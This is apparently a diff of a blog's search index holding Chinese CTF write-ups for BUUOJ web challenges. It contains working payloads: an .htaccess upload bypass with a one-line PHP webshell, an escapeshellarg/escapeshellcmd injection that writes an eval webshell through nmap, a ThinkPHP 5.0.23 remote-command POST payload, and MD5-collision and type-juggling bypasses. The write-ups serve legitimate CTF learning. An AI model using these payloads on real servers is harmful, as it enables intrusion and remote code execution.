@@ -154,74 +154,29 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
   <entry>
     <title>buuoj-upload</title>
     <url>/2020/10/08/buuoj-upload/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuoj-z7z8</title>
-    <url>/2020/10/08/buuoj-z7z8/</url>
-    <content><![CDATA[<h1 id="buuoj–杂七杂八"><a href="#buuoj–杂七杂八" class="headerlink" title="buuoj–杂七杂八"></a>buuoj–杂七杂八</h1><a id="more"></a>
+    <content><![CDATA[<h1 id="buuoj-upload"><a href="#buuoj-upload" class="headerlink" title="buuoj-upload"></a>buuoj-upload</h1><a id="more"></a>
 
 
 
-<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox); <span class="comment">//创建了路径</span></span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一个图片，发现上传成功了，还给出了文件的保存路径</p>
+<p>再尝试上传<code>1.php</code>但是出现了，报错提示</p>
+<p>首先尝试的是，将<code>Content-Type: image/jpeg</code>改为图片类型，但是还是无法上传</p>
+<p>再尝试一下.htaccess文件</p>
+<p>文件内容</p>
+<figure class="highlight plain"><figcaption><span>"a.jpg"></span></figcaption><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 
-<p>前面的两段代码没啥用，主要是后面处理 $host的过程</p>
-<p><strong>1.知识储备</strong></p>
-<blockquote>
-<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
-</blockquote>
-<blockquote>
-<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
-<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
-</blockquote>
-<p><strong>namp命令</strong></p>
-<blockquote>
-<p><code>-T5</code> :扫描等级,越大越快,越快越不安全,最好设置为<code>-T4</code><br><code>-sT</code> :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试<br><code>-Pn</code> :禁用ping<br><code>-host-timeout 2</code>:设置扫描一台主机的时间，以毫秒为单位。<br><code>-F</code> :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p>
-</blockquote>
-<p><strong>漏洞点在这</strong></p>
-<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
-<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
-<p><strong>2.构造payload</strong></p>
-<blockquote>
-<ol>
-<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
-<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
-<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
-<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li>
-</ol>
-</blockquote>
-<p><strong>回到<code>mail</code>中，我们的 payload 最终在执行时变成了<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，最终的参数就是这样被注入的。</strong></p>
-<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">参考</a></p>
-<p>需要绕过上面的两个函数，先试试两个函数的作用</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">" 1'shellcode "</span>;</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">' 1'\''shellcode '</span><br><span class="line">' <span class="number">1</span>'\\''shellcode \'</span><br></pre></td></tr></table></figure>
-
-<p>构造的一句话木马为：<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
-<p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
-<p>这里的单引号都是成对出现的，所以没影响</p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/08/buuoj-z7z8/online1.png" alt></p>
-<p>上传文件的保存路径，利用蚁剑链接一下</p>
-<p><img src="/2020/10/08/buuoj-z7z8/online2.png" alt></p>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
-<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
-<p>(写的有点乱)</p>
+<p><img src="/2020/10/08/buuoj-upload/1-2.png" alt></p>
+<p>上传成功后，再上传包含一句话木马的 a.jpg文件，<code>.htaccess</code>文件的作用就是将指定类型的文件当作php文件运行</p>
+<p>所以表面上是jpg类型的文件，但是是当作php文件</p>
+<p><img src="/2020/10/08/buuoj-upload/1-1.png" alt></p>
+<p>上传成功后，蚁剑访问<code>url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg</code></p>
+<p>密码为：cmd</p>
 ]]></content>
       <categories>
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>shell</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1405,5 +1360,95 @@ E#---
       <categories>
         <category>木马</category>
       </categories>
+  </entry>
+  <entry>
+    <title>buuoj-z7z8</title>
+    <url>/2020/10/08/buuoj-z7z8/</url>
+    <content><![CDATA[<h1 id="buuoj–杂七杂八"><a href="#buuoj–杂七杂八" class="headerlink" title="buuoj–杂七杂八"></a>buuoj–杂七杂八</h1><a id="more"></a>
+
+
+
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox); <span class="comment">//创建了路径</span></span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面的两段代码没啥用，主要是后面处理 $host的过程</p>
+<p><strong>1.知识储备</strong></p>
+<blockquote>
+<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
+</blockquote>
+<blockquote>
+<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
+</blockquote>
+<p><strong>namp命令</strong></p>
+<blockquote>
+<p><code>-T5</code> :扫描等级,越大越快,越快越不安全,最好设置为<code>-T4</code><br><code>-sT</code> :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试<br><code>-Pn</code> :禁用ping<br><code>-host-timeout 2</code>:设置扫描一台主机的时间，以毫秒为单位。<br><code>-F</code> :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p>
+</blockquote>
+<p><strong>漏洞点在这</strong></p>
+<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
+<p><strong>2.构造payload</strong></p>
+<blockquote>
+<ol>
+<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
+<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
+<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li>
+</ol>
+</blockquote>
+<p><strong>回到<code>mail</code>中，我们的 payload 最终在执行时变成了<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，最终的参数就是这样被注入的。</strong></p>
+<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">参考</a></p>
+<p>需要绕过上面的两个函数，先试试两个函数的作用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">" 1'shellcode "</span>;</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">' 1'\''shellcode '</span><br><span class="line">' <span class="number">1</span>'\\''shellcode \'</span><br></pre></td></tr></table></figure>
+
+<p>构造的一句话木马为：<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
+<p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
+<p>这里的单引号都是成对出现的，所以没影响</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/08/buuoj-z7z8/online1.png" alt></p>
+<p>上传文件的保存路径，利用蚁剑链接一下</p>
+<p><img src="/2020/10/08/buuoj-z7z8/online2.png" alt></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
+<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
+<p>(写的有点乱)</p>
+<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示</p>
+<p><img src="/2020/10/08/buuoj-z7z8/cve.png" alt></p>
+<p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
+<p>先看看报错信息:1 <code>url+?s=1</code></p>
+<p><img src="/2020/10/08/buuoj-z7z8/cve-1.png" alt></p>
+<p>php版本为5.0.23，上网搜了一下这版本的漏洞</p>
+<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
+<p>直接构造payload，读取目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url</span><br><span class="line">POST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/08/buuoj-z7z8/cve-2.png" alt></p>
+<p>看到了flag文件</p>
+<p>读取flag</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">url</span><br><span class="line"><span class="symbol">POST:</span>_method=__construct<span class="variable">&amp;filter</span>[]=system<span class="variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/08/buuoj-z7z8/cve-3.png" alt></p>
+<h2 id="md"><a href="#md" class="headerlink" title="md"></a>md</h2><p><code>I put something in F12 for you</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">	<span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">			$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">			<span class="keyword">if</span> (!is_numeric($passwd)) &#123;</span><br><span class="line">				<span class="keyword">if</span>($passwd==<span class="number">1234567</span>) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">					highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先F12找一找提示，原来就是格式化好的源码</p>
+<p><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code></p>
+<p>直接使用数组绕过，也可以使用md5强碰撞的两字符串</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">param<span class="number">1</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1U</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br><span class="line">param<span class="number">2</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%02</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1</span><span class="symbol">%D5</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br></pre></td></tr></table></figure>
+
+<p><code>if (!is_numeric($passwd))</code>弱类型比较，使用1234567a绕过</p>
+<p>payload:</p>
+<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="built_in">?id</span>=M<span class="meta">%C9h</span><span class="meta">%FF</span><span class="meta">%0E</span><span class="meta">%E3</span><span class="meta">%5C</span><span class="meta">%20</span><span class="meta">%95r</span><span class="meta">%D4w</span><span class="meta">%7Br</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%D3o</span><span class="meta">%A7</span><span class="meta">%B2</span><span class="meta">%1B</span><span class="meta">%DCV</span><span class="meta">%B7J</span><span class="meta">%3D</span><span class="meta">%C0x</span><span class="meta">%3E</span><span class="meta">%7B</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%AF</span><span class="meta">%BF</span><span class="meta">%A2</span><span class="meta">%00</span><span class="meta">%A8</span><span class="meta">%28K</span><span class="meta">%F3n</span><span class="meta">%8EKU</span><span class="meta">%B3_Bu</span><span class="meta">%93</span><span class="meta">%D8Igm</span><span class="meta">%A0</span><span class="meta">%D1U</span><span class="meta">%5D</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%FB_</span><span class="meta">%07</span><span class="meta">%FE</span><span class="meta">%A2</span>&amp;gg=M<span class="meta">%C9h</span><span class="meta">%FF</span><span class="meta">%0E</span><span class="meta">%E3</span><span class="meta">%5C</span><span class="meta">%20</span><span class="meta">%95r</span><span class="meta">%D4w</span><span class="meta">%7Br</span><span class="meta">%15</span><span class="meta">%87</span><span class="meta">%D3o</span><span class="meta">%A7</span><span class="meta">%B2</span><span class="meta">%1B</span><span class="meta">%DCV</span><span class="meta">%B7J</span><span class="meta">%3D</span><span class="meta">%C0x</span><span class="meta">%3E</span><span class="meta">%7B</span><span class="meta">%95</span><span class="meta">%18</span><span class="meta">%AF</span><span class="meta">%BF</span><span class="meta">%A2</span><span class="meta">%02</span><span class="meta">%A8</span><span class="meta">%28K</span><span class="meta">%F3n</span><span class="meta">%8EKU</span><span class="meta">%B3_Bu</span><span class="meta">%93</span><span class="meta">%D8Igm</span><span class="meta">%A0</span><span class="meta">%D1</span><span class="meta">%D5</span><span class="meta">%5D</span><span class="meta">%83</span><span class="meta">%60</span><span class="meta">%FB_</span><span class="meta">%07</span><span class="meta">%FE</span><span class="meta">%A2</span></span><br><span class="line"></span><br><span class="line">POST:passwd=<span class="number">1234567</span>a</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"><span class="built_in">?id</span>[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">POST:passwd=<span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+      </tags>
   </entry>
 </search>
